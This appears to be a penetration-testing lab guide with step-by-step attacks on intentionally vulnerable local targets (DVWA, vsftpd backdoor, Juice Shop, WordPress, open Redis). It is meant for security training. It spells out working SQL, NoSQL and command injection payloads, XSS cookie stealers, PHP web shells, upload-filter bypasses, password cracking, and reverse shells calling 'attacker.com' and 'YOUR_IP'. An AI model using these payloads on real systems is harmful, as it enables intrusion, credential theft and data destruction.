# Attack Scenarios - Step-by-Step Walkthroughs

This document provides detailed, step-by-step walkthroughs for practicing various attack techniques in the lab environment.

## WARNING
These scenarios are for educational purposes only in an isolated lab environment. Never attempt these techniques on systems you don't own or without explicit written authorization.

---

## Scenario 1: SQL Injection on DVWA (Beginner)

### Objective
Extract user credentials from the DVWA database using SQL injection.

### Prerequisites
- Lab running: `./lab.sh start`
- Access to http://localhost:8080
- DVWA credentials: admin:password

### Step-by-Step

1. **Access DVWA and Login**
   ```bash
   # Open browser and navigate to:
   http://localhost:8080
   # Login with: admin / password
   # Click on "DVWA Security" and set security level to "low"
   ```

2. **Navigate to SQL Injection Module**
   ```bash
   # Click on "SQL Injection" in the left menu
   # You'll see a form asking for a User ID
   ```

3. **Test for SQL Injection**
   ```sql
   -- Enter in the input field:
   1

   -- Result: Shows user ID and first name
   -- Now try:
   1' OR '1'='1

   -- Result: Shows all users! This is the vulnerability
   ```

4. **Determine Number of Columns**
   ```sql
   -- Use ORDER BY to find column count:
   1' ORDER BY 1--        # Works
   1' ORDER BY 2--        # Works
   1' ORDER BY 3--        # Works
   1' ORDER BY 4--        # Error - only 3 columns
   ```

5. **Find Vulnerable Columns**
   ```sql
   -- Use UNION to find which columns are visible:
   1' UNION SELECT 1,2,3--

   -- Result: You'll see numbers on the page (e.g., 1, 2, 3)
   -- These are the columns you can use to extract data
   ```

6. **Extract Database Information**
   ```sql
   -- Get database version:
   1' UNION SELECT 1,@@version,3--

   -- Get current database name:
   1' UNION SELECT 1,database(),3--

   -- Result: "dvwa"
   ```

7. **Extract Table Names**
   ```sql
   -- Get MySQL version to determine query syntax:
   1' UNION SELECT 1,@@version,3--
   # If version 5.x, use information_schema

   -- Get all tables:
   1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
   ```

8. **Extract Column Names**
   ```sql
   -- Get columns from the 'users' table:
   1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
   ```

9. **Extract User Data**
   ```sql
   -- Get usernames and passwords:
   1' UNION SELECT 1,user,3 FROM users--
   1' UNION SELECT 1,password,3 FROM users--

   -- Get both at once:
   1' UNION SELECT 1,concat(user,':',password),3 FROM users--
   ```

10. **Crack Passwords**
    ```bash
    # Copy the hash (e.g., for admin: 5f4dcc3b5aa765d61d8327deb882cf99)
    # This is an MD5 hash. Use online tools or John the Ripper:

    echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    john --show hash.txt
    # Result: password
    ```

### Learning Outcomes
- Understanding SQL injection vulnerabilities
- Manual SQL injection techniques
- Database structure discovery
- Hash cracking basics

---

## Scenario 2: VSFTPD Backdoor Exploitation (Beginner)

### Objective
Gain root shell access through VSFTPD backdoor vulnerability (CVE-2011-2523).

### Prerequisites
- Lab running: `./lab.sh start`
- Telnet client installed

### Step-by-Step

1. **Reconnaissance**
   ```bash
   # Scan for FTP services
   nmap -sV -p 21 localhost

   # Output shows: vsftpd 2.3.4
   # This version has a known backdoor vulnerability
   ```

2. **Verify Vulnerability**
   ```bash
   # Connect with telnet
   telnet localhost 21

   # You should see:
   # 220 (vsFTPd 2.3.4)
   # This is the vulnerable version!
   ```

3. **Exploit the Backdoor**
   ```bash
   # In the telnet session, enter:
   User: smile:)
   # You'll see: "331 Please specify the password"

   Pass: smile
   # If successful, you'll get a shell prompt with root access!

   # Try commands:
   whoami    # Should show: root
   id        # Should show: uid=0(root)
   ls -la    # List files
   cat /etc/passwd    # Read sensitive files
   ```

4. **Post-Exploitation**
   ```bash
   # Check what services are running
   ps aux

   # Check network connections
   netstat -tulpn

   # Look for interesting files
   find / -name "*.txt" 2>/dev/null
   find / -name "*.conf" 2>/dev/null

   # Check for other containers on the network
   cat /etc/hosts
   ping dvwa
   ping mysql_weak
   ```

### Learning Outcomes
- Service version reconnaissance
- Exploiting known vulnerabilities
- Backdoor exploitation
- Basic post-exploitation activities

---

## Scenario 3: Stored XSS in DVWA (Beginner)

### Objective
Execute JavaScript in the browser of anyone viewing DVWA guestbook using Stored XSS.

### Prerequisites
- Lab running
- DVWA access

### Step-by-Step

1. **Access DVWA XSS (Stored) Module**
   ```bash
   # Navigate to:
   http://localhost:8080/vulnerabilities/xss_s/

   # Set security level to "low"
   ```

2. **Test for XSS**
   ```html
   <!-- In the "Name" field, enter: -->
   <script>alert('XSS')</script>

   <!-- In the "Message" field, enter: -->
   Test message

   <!-- Click "Sign Guestbook" -->
   ```

3. **Verify XSS Execution**
   ```bash
   # The JavaScript alert should execute immediately
   # More importantly, it will execute for ANY user viewing the guestbook

   # Try a different payload:
   <img src=x onerror=alert('XSS')>

   # Or document.cookie theft:
   <script>fetch('http://your-server/?c='+document.cookie)</script>
   ```

4. **Advanced Payload: Cookie Stealer**
   ```bash
   # In a separate terminal, start a simple server to capture cookies:
   python3 -m http.server 8000

   # In DVWA, enter this XSS payload:
   <script>
   var i = new Image();
   i.src = "http://localhost:8000/?cookie=" + document.cookie;
   </script>

   # Check your server logs - you'll capture the DVWA session cookie!
   ```

5. **Session Hijacking**
   ```bash
   # Use the stolen cookie to access the application as the admin:
   # Copy the captured cookie (PHPSESSID=xxxxx)

   # In your browser:
   # 1. Open Developer Tools (F12)
   # 2. Go to Console
   # 3. Enter: document.cookie="PHPSESSID=captured_cookie_value"
   # 4. Refresh the page - you're now logged in as that user!
   ```

### Learning Outcomes
- Understanding stored vs reflected XSS
- XSS payload development
- Cookie theft and session hijacking
- Browser security model

---

## Scenario 4: Command Injection in DVWA (Beginner)

### Objective
Execute arbitrary system commands through the DVWA ping functionality.

### Prerequisites
- Lab running
- DVWA access

### Step-by-Step

1. **Access Command Injection Module**
   ```bash
   # Navigate to:
   http://localhost:8080/vulnerabilities/exec/

   # Set security level to "low"
   ```

2. **Test Normal Functionality**
   ```bash
   # Enter: 127.0.0.1
   # Result: Normal ping output
   ```

3. **Test for Command Injection**
   ```bash
   # Try command separator:
   127.0.0.1; ls

   # You'll see ping output AND directory listing!
   # This means commands are being executed without validation

   # Try other separators:
   127.0.0.1 && ls
   127.0.0.1 | ls
   127.0.0.1 `ls`
   127.0.0.1 $(ls)
   ```

4. **Useful Commands**
   ```bash
   # Read /etc/passwd:
   127.0.0.1; cat /etc/passwd

   # List files:
   127.0.0.1; ls -la

   # Check current user:
   127.0.0.1; whoami

   # Check network config:
   127.0.0.1; ifconfig

   # Download and execute (if wget available):
   127.0.0.1; wget http://attacker.com/shell.sh
   127.0.0.1; chmod +x shell.sh
   127.0.0.1; ./shell.sh
   ```

5. **Reverse Shell**
   ```bash
   # In your terminal, start a listener:
   nc -lvnp 4444

   # In the DVWA input, enter:
   127.0.0.1; nc -e /bin/bash localhost 4444

   # Or if nc doesn't support -e:
   127.0.0.1; nc -c /bin/bash localhost 4444

   # You should get a reverse shell connection!
   ```

### Learning Outcomes
- Command injection vulnerabilities
- System command execution through web apps
- Reverse shell creation
- Input validation importance

---

## Scenario 5: File Upload Vulnerability (Intermediate)

### Objective
Upload and execute a PHP web shell through DVWA file upload.

### Prerequisites
- Lab running
- DVWA access
- Basic PHP knowledge

### Step-by-Step

1. **Access File Upload Module**
   ```bash
   # Navigate to:
   http://localhost:8080/vulnerabilities/upload/

   # Set security level to "low"
   ```

2. **Create Web Shell**
   ```php
   <?php
   // Simple web shell
   system($_GET['cmd']);
   ?>

   <!-- Save this as shell.php -->
   ```

3. **Upload the File**
   ```bash
   # In the DVWA upload form, select shell.php
   # Click "Upload"

   # You'll see: "succesfully uploaded"
   # Note the path hint in the page source
   ```

4. **Execute the Shell**
   ```bash
   # Access your uploaded shell at:
   http://localhost:8080/hackable/uploads/shell.php?cmd=ls

   # Try different commands:
   http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
   http://localhost:8080/hackable/uploads/shell.php?cmd=cat /etc/passwd
   http://localhost:8080/hackable/uploads/shell.php?cmd=uname -a
   ```

5. **Advanced Web Shell**
   ```php
   <?php
   // Better web shell with output
   echo "<pre>";
   echo shell_exec($_GET['cmd']);
   echo "</pre>";
   ?>

   <!-- Or with POST method for stealth: -->
   <?php
   if (isset($_POST['cmd'])) {
     system($_POST['cmd']);
   }
   ?>
   <form method="POST">
   <input name="cmd" />
   <input type="submit" />
   </form>
   ```

6. **Bypass Upload Restrictions (Medium Security)**
   ```bash
   # Change security level to "medium"
   # Now .php files are blocked

   # Try these bypasses:
   # 1. Double extension: shell.php.jpg
   # 2. Null byte: shell.php%00.jpg
   # 3. Alternate extensions: shell.phtml, shell.php3, shell.php4
   # 4. Case manipulation: shell.PHP
   # 5. Add spaces: shell.php .
   ```

### Learning Outcomes
- File upload vulnerabilities
- Web shell creation and use
- Upload filter bypass techniques
- Server-side validation issues

---

## Scenario 6: WordPress Plugin Enumeration (Intermediate)

### Objective
Enumerate WordPress plugins and exploit known vulnerabilities.

### Prerequisites
- Lab running
- WPScan installed

### Step-by-Step

1. **Initial WordPress Reconnaissance**
   ```bash
   # Access WordPress:
   curl -I http://localhost:8084

   # View page source:
   curl http://localhost:8084 | grep "wp-content"

   # Identify WordPress version:
   wpscan --url http://localhost:8084 --enumerate vp
   ```

2. **Enumerate Plugins**
   ```bash
   # Find all installed plugins:
   wpscan --url http://localhost:8084 --enumerate p

   # Common plugin locations:
   # http://localhost:8084/wp-content/plugins/

   # Check for specific plugins:
   curl -I http://localhost:8084/wp-content/plugins/akismet/
   curl -I http://localhost:8084/wp-content/plugins/contact-form-7/
   ```

3. **Enumerate Themes**
   ```bash
   # List themes:
   wpscan --url http://localhost:8084 --enumerate t

   # Check theme files:
   curl http://localhost:8084/wp-content/themes/twentytwentyone/readme.txt
   ```

4. **Enumerate Users**
   ```bash
   # Find all usernames:
   wpscan --url http://localhost:8084 --enumerate u

   # Or manually check:
   curl http://localhost:8084/?author=1    # admin
   curl http://localhost:8084/?author=2    # user2
   ```

5. **Password Attack**
   ```bash
   # Brute force admin password:
   wpscan --url http://localhost:8084 \
     --password-attack wp-login \
     --username admin \
     --passwords /usr/share/wordlists/rockyou.txt
   ```

6. **Exploit Known Vulnerabilities**
   ```bash
   # Search for WordPress CVEs:
   searchsploit WordPress 5.9

   # Search for specific plugin exploits:
   searchsploit "wordpress plugin"

   # Manual exploitation example (if vulnerable plugin found):
   # Upload plugin vulnerability
   # SQL injection in plugin
   # File upload through media
   ```

### Learning Outcomes
- CMS reconnaissance
- Plugin enumeration
- User enumeration
- Password attacks
- CVE exploitation

---

## Scenario 7: NoSQL Injection in Juice Shop (Intermediate)

### Objective
Bypass authentication using NoSQL injection in OWASP Juice Shop.

### Prerequisites
- Lab running
- Access to Juice Shop at http://localhost:3000

### Step-by-Step

1. **Access Juice Shop**
   ```bash
   # Navigate to:
   http://localhost:3000

   # Explore the application structure
   # This is a modern Node.js application
   ```

2. **Identify Login Endpoint**
   ```bash
   # Try to login with test credentials
   # Intercept the request with Burp Suite

   # Login endpoint: POST /rest/user/login
   # Body format (JSON):
   {
     "email": "user@test.com",
     "password": "password123"
   }
   ```

3. **Test for NoSQL Injection**
   ```json
   // Try JSON injection:
   {
    "email": {"$ne": null},
    "password": {"$ne": null}
   }

   // This translates to: email != null AND password != null
   // Might authenticate as the first user in database

   // Try regex injection:
   {
    "email": {"$regex": ".*"},
    "password": {"$regex": ".*"}
   }

   // Try with admin:
   {
    "email": {"$regex": "admin.*"},
    "password": {"$regex": ".*"}
   }
   ```

4. **Advanced NoSQL Injection**
   ```json
   // Use $where operator:
   {
    "email": {"$ne": null},
    "password": {"$where": "this.password == this.password"}
   }

   // Blind NoSQL injection:
   {
    "email": "admin@juice-sh.op",
    "password": {"$ne": "wrong"}
   }
   ```

5. **Extract Data**
   ```json
   // If you have admin access, try accessing:
   GET /rest/admin/application-logs
   GET /rest/admin/users
   GET /rest/basket/1

   // Try MongoDB operators in other endpoints:
   {"$ne": null}
   {"$gt": ""}
   {"$regex": ".*"}
   ```

### Learning Outcomes
- NoSQL vs SQL injection differences
- MongoDB operator exploitation
- JSON-based injection
- Modern web application vulnerabilities

---

## Scenario 8: Redis No Authentication (Beginner)

### Objective
Access and manipulate Redis database with no authentication.

### Prerequisites
- Lab running
- redis-cli installed

### Step-by-Step

1. **Connect to Redis**
   ```bash
   redis-cli -h localhost -p 6379

   # No password required!
   # You're now connected with full access
   ```

2. **Enumerate Database**
   ```bash
   # Get server info:
   INFO

   # List all keys:
   KEYS *

   # Get database size:
   DBSIZE

   # Check current database:
   SELECT 0
   ```

3. **Read Data**
   ```bash
   # Get value of a key:
   GET keyname

   # Get all keys and values:
   KEYS *
   # Then for each key:
   GET key1
   GET key2
   ```

4. **Write Data**
   ```bash
   # Set a key:
   SET mykey "myvalue"

   # Set with expiration:
   SET tempkey "tempvalue" EX 60

   # Create malicious data:
   SET webshell "<?php system($_GET['cmd']); ?>"
   ```

5. **Dangerous Commands**
   ```bash
   # Delete all keys:
   FLUSHALL

   # Delete all keys in current database:
   FLUSHDB

   # Save config:
   CONFIG SET dir /etc/
   CONFIG SET dbfilename shadow
   SAVE
   ```

6. **Redis Remote Code Execution**
   ```bash
   # If Redis runs as root (common vulnerability):
   # 1. Create a file in /var/spool/cron/crontabs/

   CONFIG SET dir /var/spool/cron/crontabs/
   CONFIG SET dbfilename root
   save

   # 2. Set cron job
   set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n\n"
   save

   # This creates a reverse shell that connects back every minute
   ```

### Learning Outcomes
- NoSQL database security
- Redis architecture and commands
- Privilege escalation through services
- Data persistence vulnerabilities

---

## Practice Tips

1. **Start Simple**: Begin with low security levels and progress
2. **Document Everything**: Keep notes on what works and what doesn't
3. **Use Multiple Tools**: Don't rely on just one tool or technique
4. **Understand the Vulnerability**: Not just how to exploit, but why it exists
5. **Try Manual Methods**: Automated tools are great, but manual testing teaches you more
6. **Be Creative**: Think of different payloads and approaches

## Additional Resources

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

Remember: Practice makes perfect. Each scenario teaches different skills that build upon each other!
